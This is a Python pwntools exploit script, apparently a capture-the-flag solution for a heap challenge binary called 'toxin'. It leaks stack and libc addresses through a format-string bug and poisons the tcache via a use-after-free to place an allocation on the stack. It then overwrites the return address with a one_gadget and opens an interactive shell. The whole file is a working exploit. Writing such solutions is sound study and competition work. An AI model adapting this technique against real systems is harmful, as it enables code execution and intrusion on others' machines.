from pwn import *
from pwn import p64

IS_LOCAL = False
IS_DEBUG = False

INPUT_FILENAME = "toxin_patched"

REMOTE_HOST = ""
REMOTE_PORT = 31828

# setup terminal
context.terminal = ['tmux', 'new-window', '-F' '#{pane_pid}', '-P']
#run_in_new_terminal('bash')

if IS_LOCAL:
    io = process(INPUT_FILENAME, aslr=False)
    if IS_DEBUG:
        pid, io_gdb = gdb.attach(io, api=True, gdbscript="""
            continue
        """)
else:
    io = remote(REMOTE_HOST, REMOTE_PORT)

def new_toxin(index: int, data: bytes):
    io.recvuntil(b"> ")
    io.sendline(b"1")
    io.recvuntil(b": ")
    io.sendline(str(len(data)).encode())
    io.recvuntil(b": ")
    io.sendline(str(index).encode())
    io.recvuntil(b": ")
    io.sendline(data)

def edit_toxin(index: int, data: bytes):
    io.recvuntil(b"> ")
    io.sendline(b"2")
    io.recvuntil(b": ")
    io.sendline(str(index).encode())
    io.recvuntil(b": ")
    io.sendline(data)

def drink_toxin(index: int):
    io.recvuntil(b"> ")
    io.sendline(b"3")
    io.recvuntil(b": ")
    io.sendline(str(index).encode())

def search_toxin(data: bytes) -> bytes:
    io.recvuntil(b"> ")
    io.sendline(b"4")
    io.recvuntil(b": ")
    io.sendline(data)
    return io.recvline()

def re_drink():
    io_gdb.execute('set *(long*)(&toxinfreed)=0')

ALLOC_LEN = 0xE0

def allocate_target_memory(addr: int):
    log.info(f'Generating a random pattern...')
    pat = cyclic(ALLOC_LEN)

    log.info(f'Allocating a new memory...')
    new_toxin(0, pat)

    log.info(f'After freeing the allocated memory, the pointer is still present in the toxins array...')
    drink_toxin(0)

    log.info(f'Use the UAF to set the forward pointer to the target address...')
    edit_toxin(0, addr.to_bytes(8, 'little'))

    log.info(f'Drop off the first TCache pointer...')
    new_toxin(1, pat)

STACK_FMT = b"%8$p"
STACK_RET_ADDR = 0x7fffffffe0a8
STACK_LEAK_LOCAL = 0x7fffffffe0c0
STACK_OFFSET = STACK_LEAK_LOCAL - STACK_RET_ADDR

stack_leak = int(search_toxin(STACK_FMT), 16)
log.info(f'Leaked STACK address: {hex(stack_leak)}')
stack_target = stack_leak - STACK_OFFSET
log.info(f'Target STACK address: {hex(stack_target)}')

LIBC_FMT = b"%3$p"
LIBC_BASE_LOCAL = 0x155554f3b000
LIBC_LEAK_LOCAL = 0x15555504b081
LIBC_BASE_OFFSET = LIBC_LEAK_LOCAL - LIBC_BASE_LOCAL

libc_leak = int(search_toxin(LIBC_FMT), 16)
log.info(f'Leaked LIBC address: {hex(libc_leak)}')
libc_base = libc_leak - LIBC_BASE_OFFSET
log.info(f'LIBC base: {hex(libc_base)}')

allocate_target_memory(stack_target)

#io_gdb.execute('break *0x000055555555544B')

#ONE_GADGET_1 = libc_base + 0x4f2c5
ONE_GADGET_2 = libc_base + 0x4f322
#ONE_GADGET_3 = libc_base + 0x10a38c

log.info(f'Generating payload...')

payload = flat(
    {
        0: ONE_GADGET_2.to_bytes(0x8, 'little'),
        8: b'\0' * (0xE0 - 0x9) # cuz when press ENTER '0xA' is the last byte
    },
    length = ALLOC_LEN,
    filler = b'\0'
)

log.info(f'Triggering return address overwrite...')
new_toxin(2, payload)

log.info(f'Getting a remote shell...')
io.interactive()
